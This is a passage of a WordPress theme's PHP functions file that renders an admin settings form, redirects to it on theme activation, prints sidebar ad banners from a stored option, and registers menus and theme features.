            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><? if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
        <?php 		break;
	
 
} 
}
?>

<!--</table>-->

<p class="submit">
<input name="save" type="submit" value="Save changes" />    
<input type="hidden" name="action" value="save" />
</p>
</form>

<?php
}
mytheme_admin_init();
    global $pagenow;
    if(isset($_GET['activated'] ) && $pagenow == "themes.php") {
        wp_redirect( admin_url('themes.php?page=functions.php') );
        exit();
    }


add_action('admin_menu', 'mytheme_add_admin');

function sidebar_ads_125()
{
	 global $shortname;
	 $option_name = $shortname."_ads_125";
	 $option = get_option($option_name);
	 $values = explode("\n", $option);
	 if(is_array($values)) {
	 	foreach ($values as $item) {
		 	$ad = explode(',', $item);
		 	$banner = trim($ad['0']);
		 	$url = trim($ad['1']);
		 	if(!empty($banner) && !empty($url)) {
		 		echo "<a href=\"$url\" target=\"_new\"><img class=\"ad125\" src=\"$banner\" /></a> \n";
		 	}
		 }
	 }
}
?>
<?php if ( function_exists("add_theme_support") ) { add_theme_support("post-thumbnails"); } ?>
<?php
    if(function_exists('add_custom_background')) {
        add_custom_background();
    }
    
    if ( function_exists( 'register_nav_menus' ) ) {
    	register_nav_menus(
    		array(
    		  'primary' => 'Menu 1',
    		  'secondary' => 'Menu 2'
    		)
    	);
    }
?>